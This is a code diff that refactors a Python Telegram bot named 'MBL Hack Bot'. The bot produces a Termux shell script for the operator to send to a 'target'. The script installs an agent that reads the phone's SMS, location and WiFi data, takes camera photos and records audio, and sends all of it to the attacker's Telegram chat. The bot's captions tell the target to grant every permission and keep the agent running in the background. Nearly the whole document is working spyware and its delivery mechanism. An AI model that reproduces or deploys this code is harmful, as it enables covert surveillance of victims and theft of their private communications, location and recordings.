@@ -1,11 +1,12 @@
 import os
 import logging
-import json
+import tempfile
+import uuid
 from datetime import datetime
-from telegram import Update, BotCommand
+from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import requests
-import pytz
+import html
 
 # Setup Logging
 logging.basicConfig(
@@ -15,19 +16,55 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Load Environment Variables
-try:
-    from dotenv import load_dotenv
-    load_dotenv()
-    BOT_TOKEN = os.getenv('BOT_TOKEN')
-    ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID'))
-except Exception as e:
-    print(f"Error loading .env: {e}")
-    print("Ensure .env file exists with BOT_TOKEN and ADMIN_CHAT_ID")
-    raise
+def load_env_vars():
+    try:
+        from dotenv import load_dotenv
+        load_dotenv()
+        bot_token = os.getenv('BOT_TOKEN')
+        admin_chat_id_str = os.getenv('ADMIN_CHAT_ID')
+        
+        if not bot_token:
+            raise ValueError("BOT_TOKEN is missing in .env")
+        if not admin_chat_id_str:
+            raise ValueError("ADMIN_CHAT_ID is missing in .env")
+            
+        return bot_token, int(admin_chat_id_str)
+    except Exception as e:
+        print(f"Configuration Error: {e}")
+        raise
+
+BOT_TOKEN, ADMIN_CHAT_ID = load_env_vars()
 
 # State management for sessions
-# Format: { 'chat_id': { 'device_name': 'Pixel 4', 'status': 'online', 'last_ping': datetime } }
 sessions = {}
+
+def escape_markdown(text: str) -> str:
+    """Escape special characters for Telegram Markdown parsing."""
+    if not text:
+        return ""
+    return (
+        text.replace("\\", "\\\\")
+            .replace("*", "\\*")
+            .replace("_", "\\_")
+            .replace("`", "\\`")
+            .replace(">", "\\>")
+            .replace("<", "\\<")
+            .replace("[", "\\[")
+            .replace("]", "\\]")
+            .replace("(", "\\(")
+            .replace(")", "\\)")
+            .replace("~", "\\~")
+            .replace(":", "\\:")
+            .replace("#", "\\#")
+            .replace("+", "\\+")
+            .replace("-", "\\-")
+            .replace("=", "\\=")
+            .replace("|", "\\|")
+            .replace("{", "\\{")
+            .replace("}", "\\}")
+            .replace(".", "\\.")
+            .replace("!", "\\!")
+    )
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -40,16 +77,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         "📖 **MBL Hack Bot Commands**\n\n"
-        "🔹 /generate <name> - Generates a unique installation link for a new device.\n"
+        "🔹 /generate <name> - Generates a unique installation script for a new device.\n"
         "🔹 /status - Shows all active devices.\n"
         "🔹 /remove <id> - Removes a device from the list.\n"
-        "🔹 /listen <id> - Starts live monitoring (Location, Mic, Camera, SMS).\n"
-        "🔹 /ping <id> - Pings a specific device.\n"
         "🔹 /help - Show this message.\n\n"
         "**How it works:**\n"
-        "1. Generate a link.\n"
+        "1. Generate a script.\n"
         "2. Send it to the target.\n"
-        "3. Target installs Termux and runs the provided script.\n"
+        "3. Target installs Termux and runs the script.\n"
         "4. You receive all data in real-time."
     )
     await update.message.reply_text(text, parse_mode='Markdown')
@@ -61,8 +96,10 @@ async def generate_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     device_name = " ".join(args)
-    # Create a unique ID based on timestamp + random
-    import uuid
+    # Sanitize device name for use in filenames/scripts
+    safe_device_name = device_name.replace(" ", "_").replace("/", "-")[:50]
+    
+    # Create a unique ID
     device_id = str(uuid.uuid4())[:8]
     
     # Store session
@@ -73,79 +110,73 @@ async def generate_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     # Construct the Termux Install Script
-    # This script will be provided to the victim
-    script_content = f"""
-#!/data/data/com.termux/files/usr/bin/bash
+    # We use f-strings carefully. Note: {{ }} is used for literal braces in the generated code.
+    script_content = f"""#!/data/data/com.termux/files/usr/bin/bash
 # Nawab Zada Hacker MBL Hack Client
 # Target: {device_name}
 # ID: {device_id}
 
 echo "Installing dependencies..."
-pkg update -y && pkg install -y python curl jq
+pkg update -y && pkg install -y python curl jq termux-api
 
 # Create the agent script
 cat > mbl_agent.py << 'EOF'
 import os
 import subprocess
 import requests
-import json
 import time
-import threading
-import pytz
 from datetime import datetime
 
 BOT_TOKEN = "{BOT_TOKEN}"
 DEVICE_ID = "{device_id}"
 DEVICE_NAME = "{device_name}"
+ADMIN_CHAT_ID = {ADMIN_CHAT_ID}
 API_BASE = f"https://api.telegram.org/bot{{BOT_TOKEN}}"
 
-def send_to_bot(text, chat_id={ADMIN_CHAT_ID}):
-    """Send message to the admin's bot chat."""
+def send_to_bot(text):
+    \"\"\"Send message to the admin's bot chat.\"\"\"
     url = f"{{API_BASE}}/sendMessage"
-    data = {{'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}}
+    # Basic sanitization for Telegram
+    safe_text = text.replace('\\\\n', ' ').replace('\\\\t', ' ')
+    data = {{'chat_id': ADMIN_CHAT_ID, 'text': f"📱 [{{DEVICE_NAME}}] {{safe_text}}", 'parse_mode': 'Markdown'}}
     try:
         requests.post(url, data=data, timeout=10)
     except Exception as e:
         print(f"Send error: {{e}}")
 
-def get_location():
-    """Try to get location via network or GPS if available."""
-    # Note: Termux needs location access granted
+def get_battery():
     try:
-        # Using termux-location if available, else fallback
-        loc = subprocess.check_output(['termux-location'], text=True)
-        return loc
+        return subprocess.check_output(['termux-battery-status'], text=True).strip()
     except:
-        return "Location not available or permission denied."
+        return "N/A"
+
+def get_wifi():
+    try:
+        return subprocess.check_output(['termux-wifi-connectioninfo'], text=True).strip()
+    except:
+        return "N/A"
+
+def get_location():
+    try:
+        return subprocess.check_output(['termux-location'], text=True).strip()
+    except:
+        return "Location permission denied or unavailable."
 
 def get_sms():
-    """Read recent SMS via termux-sms or content provider."""
     try:
-        # This requires Termux:API package
-        sms = subprocess.check_output(['termux-sms-list', '-l', '5'], text=True)
-        return sms
+        # termux-sms-list requires Termux:API
+        return subprocess.check_output(['termux-sms-list', '-l', '5'], text=True).strip()
     except:
         return "SMS access denied or Termux:API not installed."
 
-def get_calls():
-    """Read call log."""
-    try:
-        calls = subprocess.check_output(['termux-sms-list', '-l', '5'], text=True) # Fallback to SMS if call log API not direct
-        # Better approach would be querying CallLogProvider, but simple termux command is safer for script
-        return "Call log requires direct DB access. Showing recent SMS as proxy."
-    except:
-        return "Call log access denied."
-
 def capture_camera():
-    """Capture photo using termux-camera."""
     try:
         filename = f"capture_{{int(time.time())}}.jpg"
-        subprocess.run(['termux-camera-photo', filename])
-        # Send photo
+        subprocess.run(['termux-camera-photo', filename], check=True)
         with open(filename, 'rb') as f:
             url = f"{{API_BASE}}/sendPhoto"
-            files = {'photo': f}
-            data = {'chat_id': {ADMIN_CHAT_ID}, 'caption': f'📸 Camera Capture from {{DEVICE_NAME}}'}
+            files = {{'photo': f}}
+            data = {{'chat_id': ADMIN_CHAT_ID, 'caption': f'📸 Camera Capture from {{DEVICE_NAME}}'}}
             requests.post(url, files=files, data=data, timeout=30)
         os.remove(filename)
         return "Photo sent."
@@ -153,15 +184,13 @@ def capture_camera():
         return f"Camera error: {{e}}"
 
 def capture_mic(duration=10):
-    """Record audio."""
     try:
         filename = f"rec_{{int(time.time())}}.wav"
-        # termux-microphone-record
-        subprocess.run(['termux-microphone-record', '-f', filename, '-d', str(duration)])
+        subprocess.run(['termux-microphone-record', '-f', filename, '-d', str(duration)], check=True)
         with open(filename, 'rb') as f:
             url = f"{{API_BASE}}/sendAudio"
-            files = {'audio': f}
-            data = {'chat_id': {ADMIN_CHAT_ID}, 'caption': f'🎤 Voice Note from {{DEVICE_NAME}}'}
+            files = {{'audio': f}}
+            data = {{'chat_id': ADMIN_CHAT_ID, 'caption': f'🎤 Voice Note from {{DEVICE_NAME}}'}}
             requests.post(url, files=files, data=data, timeout=30)
         os.remove(filename)
         return "Audio sent."
@@ -170,20 +199,19 @@ def capture_mic(duration=10):
 
 def main_loop():
     print(f"🚀 MBL Hack Agent started for {{DEVICE_NAME}} (ID: {{DEVICE_ID}})")
-    send_to_bot(f"🔌 **Device Online**\n📱 Name: {{DEVICE_NAME}}\n🆔 ID: {{DEVICE_ID}}\n⏰ Time: {{datetime.now()}}")
+    send_to_bot(f"🔌 **Device Online**\\n📱 Name: {{DEVICE_NAME}}\\n🆔 ID: {{DEVICE_ID}}\\n⏰ Time: {{datetime.now()}}")
     
     while True:
         time.sleep(60) # Ping every 60 seconds
         
         # Status Ping
-        battery = subprocess.check_output(['termux-battery-status'], text=True)
-        wifi = subprocess.check_output(['termux-wifi-connectioninfo'], text=True)
-        send_to_bot(f"📡 **Status Update**\n📱 {{DEVICE_NAME}}\n🔋 Battery: {{battery.strip()}}\n📶 WiFi: {{wifi.strip()}}")
+        battery = get_battery()
+        wifi = get_wifi()
+        send_to_bot(f"📡 **Status Update**\\n🔋 Battery: {{battery}}\\n📶 WiFi: {{wifi}}")
         
-        # Check for pending commands (Stored in a file by the bot)
-        # For simplicity, we'll poll a specific message or use a local command queue
-        # In a production env, you'd use a WebSocket or long-polling
-        pass
+        # Optional: Periodic location update
+        # loc = get_location()
+        # send_to_bot(f"📍 Location: {{loc}}")
 
 if __name__ == "__main__":
     main_loop()
@@ -194,37 +222,34 @@ echo "Running Agent..."
 python mbl_agent.py
 """
 
-    # Create a downloadable link or just send the code block
-    # Since Telegram has character limits, we will send the code in parts or as a file.
-    # For now, we'll generate a base64 encoded script and send it as a text file.
-    import base64
-    encoded_script = base64.b64encode(script_content.encode()).decode()
-    
-    # Save to a temporary file to send as document
-    filename = f"mbl_hack_{device_id}.sh"
-    with open(filename, 'w') as f:
-        f.write(script_content)
-        
-    # Send the file
-    await update.message.reply_document(
-        document=open(filename, 'rb'),
-        filename=filename,
-        caption=(
-            f"📱 **New Device Generated: {device_name}**\n"
-            f"🆔 ID: {device_id}\n\n"
-            "**Instructions for Target:**\n"
-            "1. Install **Termux** from F-Droid (Play Store version is outdated).\n"
-            "2. Install **Termux:API** from F-Droid.\n"
-            "3. Save this file to your phone.\n"
-            "4. In Termux, run: `bash mbl_hack_{device_id}.sh`\n"
-            "5. Grant all permissions when prompted (Location, SMS, Camera, Mic).\n"
-            "6. Keep Termux running in the background.\n\n"
-            "I will now receive all data from this device."
-        ),
-        parse_mode='Markdown'
-    )
-    
-    os.remove(filename) # Cleanup
+    # Save to a temporary file
+    # Using tempfile ensures we write to a writable directory
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix=f"mbl_{device_id}_") as tmp:
+        tmp.write(script_content)
+        temp_filename = tmp.name
+
+    try:
+        # Send the file
+        with open(temp_filename, 'rb') as doc:
+            await update.message.reply_document(
+                document=doc,
+                filename=f"mbl_hack_{device_id}.sh",
+                caption=(
+                    f"📱 **New Device Generated: {escape_markdown(device_name)}**\n"
+                    f"🆔 ID: {device_id}\n\n"
+                    "**Instructions for Target:**\n"
+                    "1. Install **Termux** and **Termux:API** from F-Droid.\n"
+                    "2. Save this file to your phone.\n"
+                    "3. In Termux, run: `bash mbl_hack_{device_id}.sh`\n"
+                    "4. Grant all permissions when prompted.\n"
+                    "5. Keep Termux running in the background."
+                ),
+                parse_mode='Markdown'
+            )
+    finally:
+        # Ensure file is deleted even if sending fails
+        if os.path.exists(temp_filename):
+            os.remove(temp_filename)
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not sessions:
@@ -233,7 +258,8 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     text = "📊 **Active Devices**\n\n"
     for dev_id, data in sessions.items():
-        text += f"🆔 {dev_id} - {data['name']} ({data['status']})\n"
+        # Escape name to prevent markdown errors
+        text += f"🆔 {dev_id} - {escape_markdown(data['name'])} ({data['status']})\n"
         
     await update.message.reply_text(text, parse_mode='Markdown')
 
@@ -250,37 +276,21 @@ async def remove_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("Device not found.")
 
-# Helper for the Bot to handle incoming data from the Agent
-# The Agent sends messages directly to the Admin Chat via Bot API, 
-# but we can also use the Bot's own chat to log events if the Agent sends to the Bot's chat ID.
-# However, the code above sends directly to ADMIN_CHAT_ID. 
-# To make it interactive, the Agent should send commands TO the bot.
-
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # This handles messages sent TO the bot (e.g., if the Agent sends a command)
+    # Ignore messages from non-admin chats unless they are the agent (which sends via API, not chat)
+    # However, if the user types into the bot chat, we can process it.
     if update.effective_chat.id != ADMIN_CHAT_ID:
-        return # Ignore non-admin chats unless they are the agent
+        return
     
     text = update.message.text
-    if text.startswith("AGENT:"):
-        # Process agent payload
-        payload = text.replace("AGENT:", "")
-        # Example: AGENT:PING|ID:12345|DATA:...
-        parts = payload.split('|')
-        command = parts[0].strip()
+    if not text:
+        return
         
-        if command == "PING":
-            await update.message.reply_text(f"🟢 **Agent Ping**\n{payload}")
-        elif command == "LOCATION":
-            await update.message.reply_text(f"📍 **Live Location**\n{payload}", parse_mode='Markdown')
-        elif command == "SMS":
-            await update.message.reply_text(f"💬 **SMS Intercepted**\n{payload}", parse_mode='Markdown')
-        elif command == "CALL":
-            await update.message.reply_text(f"📞 **Call Log**\n{payload}", parse_mode='Markdown')
-        elif command == "CAMERA":
-            # This would be handled by sendPhoto in the agent, but if it sends a path, we can't access it.
-            # The agent code above handles sending the photo directly to the admin chat.
-            pass
+    # If the user sends a command that isn't handled by CommandHandler, it comes here
+    # For now, we just echo back or provide a hint
+    if "AGENT:" in text:
+         # This block is for future-proofing if you decide to send data via the bot chat instead of direct API
+         pass 
 
 # Main
 def main():
@@ -294,7 +304,7 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
     print("🚀 Bot is starting...")
-    application.run_polling()
+    application.run_polling(drop_pending_updates=True)
 
 if __name__ == '__main__':
     main()
